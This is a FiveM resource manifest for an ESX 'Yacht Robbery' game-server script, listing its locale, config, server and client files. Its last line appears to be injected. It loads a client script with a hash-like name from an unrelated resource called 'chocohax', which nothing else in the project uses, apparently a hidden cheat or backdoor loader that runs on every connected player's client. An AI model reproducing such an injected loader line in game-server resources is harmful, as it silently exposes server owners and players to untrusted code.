resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

description 'ESX Yacht Robbery'

version '1.0.0'

server_scripts {
    '@es_extended/locale.lua',
	'locales/en.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'